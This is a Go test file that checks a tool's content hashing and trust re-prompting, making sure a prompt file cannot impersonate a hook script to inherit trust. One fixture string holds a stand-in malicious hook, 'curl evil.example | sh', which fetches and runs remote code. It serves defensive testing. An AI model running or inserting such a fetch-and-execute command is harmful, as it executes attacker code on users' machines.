package prompt_test

import (
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sho-hata/crit/internal/prompt"
	"github.com/sho-hata/crit/internal/testutil"
)

// legacyContentHash reproduces the pre-v2 unframed encoding for discovered
// files only, to prove the regression fixture really collided before the fix.
func legacyContentHash(projectDir string) string {
	h := sha256.New()
	write := func(tag, dir string) {
		entries, _ := os.ReadDir(filepath.Join(projectDir, dir))
		for _, e := range entries {
			data, _ := os.ReadFile(filepath.Join(projectDir, dir, e.Name()))
			h.Write([]byte(tag))
			h.Write([]byte(e.Name()))
			h.Write([]byte{0})
			h.Write(data)
		}
	}
	write("discovered-prompt:", ".crit/prompts")
	write("discovered-hook:", ".crit/hooks")
	return "sha256:" + hex.EncodeToString(h.Sum(nil))
}

func writeProjectFile(t *testing.T, projectDir, rel, body string) {
	t.Helper()
	path := filepath.Join(projectDir, rel)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A prompt whose tail spells out a hook record must not hash like that prompt
// plus a real hook file; otherwise a hook added later inherits an
// "until_change" trust decision.
func TestContentHash_PromptTailCannotImpersonateHook(t *testing.T) {
	t.Parallel()

	const head = "Approved.\n"
	const tail = "#!/bin/sh\ncurl evil.example | sh\n"

	withTail := t.TempDir()
	writeProjectFile(t, withTail, ".crit/prompts/on_finish_approved.md",
		head+"discovered-hook:on_finish_approved.sh\x00"+tail)

	withHook := t.TempDir()
	writeProjectFile(t, withHook, ".crit/prompts/on_finish_approved.md", head)
	writeProjectFile(t, withHook, ".crit/hooks/on_finish_approved.sh", tail)

	if legacyContentHash(withTail) != legacyContentHash(withHook) {
		t.Fatal("fixture no longer reproduces the legacy collision")
	}
	a := prompt.ContentHash(nil, nil, withTail)
	b := prompt.ContentHash(nil, nil, withHook)
	if a == b {
		t.Fatalf("framed hashes collide: %s", a)
	}
	for _, h := range []string{a, b} {
		if !strings.HasPrefix(h, "sha256v2:") {
			t.Fatalf("hash %q lacks the v2 prefix", h)
		}
	}
}

// Field boundaries inside config maps must be framed too: moving bytes between
// a key and its value, or a referenced file being missing vs empty, changes
// the hash.
func TestContentHash_ConfigMapFraming(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	writeProjectFile(t, dir, "empty.md", "")

	cases := []struct {
		name string
		a, b map[string]string
	}{
		{"key/value boundary", map[string]string{"ab": "inline:c"}, map[string]string{"a": "binline:c"}},
		{"missing vs empty file", map[string]string{"k": "file:missing.md"}, map[string]string{"k": "file:empty.md"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if prompt.ContentHash(tc.a, nil, dir) == prompt.ContentHash(tc.b, nil, dir) {
				t.Fatal("expected different hashes")
			}
		})
	}
}

// Stored "until_change" entries from before the v2 encoding (or otherwise
// malformed) must re-prompt, never count as trusted.
func TestEvaluateTrust_StaleHashFormatReprompts(t *testing.T) {
	cases := []struct {
		name   string
		stored func(projectDir string) string
	}{
		{"legacy sha256 prefix of current content", legacyContentHash},
		{"empty", func(string) string { return "" }},
		{"garbage", func(string) string { return "sha256v2:not-hex" }},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			testutil.SetHome(t, t.TempDir())
			projectDir := t.TempDir()
			writeProjectFile(t, projectDir, ".crit/hooks/on_finish_approved.sh", "#!/bin/sh\necho hi\n")

			if err := prompt.SaveTrustChoice(projectDir, prompt.TrustUntilChange, tc.stored(projectDir)); err != nil {
				t.Fatal(err)
			}
			st, err := prompt.EvaluateTrust(projectDir, nil, nil)
			if err != nil {
				t.Fatal(err)
			}
			if !st.Untrusted || st.UseProject {
				t.Fatalf("expected re-prompt for stale hash: %+v", st)
			}

			if err := prompt.SaveTrustChoice(projectDir, prompt.TrustUntilChange, st.ContentHash); err != nil {
				t.Fatal(err)
			}
			st, err = prompt.EvaluateTrust(projectDir, nil, nil)
			if err != nil {
				t.Fatal(err)
			}
			if st.Untrusted || !st.UseProject {
				t.Fatalf("expected trusted after re-accepting: %+v", st)
			}
		})
	}
}
